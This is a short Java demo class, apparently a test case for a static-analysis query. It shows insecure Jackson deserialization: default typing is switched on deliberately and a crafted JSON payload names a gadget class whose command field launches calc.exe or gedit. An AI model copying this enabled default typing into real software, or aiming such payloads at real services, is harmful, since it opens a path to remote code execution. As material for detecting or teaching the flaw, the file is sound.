package com.gypsyengineer.ql.fun.jackson.two;

import com.fasterxml.jackson.databind.ObjectMapper;

public class UnsafeCatDeserialization {

    private static final String command =
            System.getProperty("os.name").toLowerCase().contains("windows")
                    ? "calc.exe" : "gedit";

    private static final String bad =
            "{\"name\":\"Dude\",\"tag\":[" +
                    "\"com.popular.lib.Exec\"," +
                    "{\"command\":\"" + command + "\"}]}";

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();

        // this enables polymorphic type handling
        mapper.enableDefaultTyping();

        Cat cat = mapper.readValue(bad, Cat.class);
        System.out.println(cat.toString());
    }
}
